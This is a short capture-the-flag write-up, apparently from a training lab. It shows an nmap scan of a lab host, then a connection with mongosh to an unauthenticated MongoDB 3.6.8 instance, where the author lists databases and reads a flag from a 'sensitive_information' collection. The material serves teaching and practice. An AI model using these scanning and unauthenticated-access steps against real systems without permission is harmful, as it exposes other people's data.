`sudo nmap -vvv -Pn -sC -sCV --reason -T4 -p0-65535 10.129.9.40`
```
PORT      STATE SERVICE REASON         VERSION\
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN
1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIG
PZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
27017/tcp open  mongodb syn-ack ttl 63 MongoDB 3.6.8 3.6.8

```

This challenge mainly revolved around installing and interacting with the mongoshell to gather information about a mongo database 


First I had to get the file `curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz`
This tar file contains the tools to work with this version of mongodb

Next we unzip `tar xvf mongosh-2.3.2-linux-x64.tgz`

We change directories to where we extracted those files and run mongosh to connect to the database `./mongosh mongodb://10.129.9.40:27017`


Now that we are connected we enumerate info about the database 

`show dbs`

We see a db called `sensitive_information`. We connect to that database. using `use sensitive_information` 

```
show collections                                        
flag                                                                           
sensitive_information> db.flag                                                 
db.flag                      
```

We use `show collections` to see the collections in this db 

```
db.flag.find()                                          
[                                                                              
  {                                                                            
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),                                 
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'                                   
  }                                    
```


We use `db.flag.find()` to get our flag. 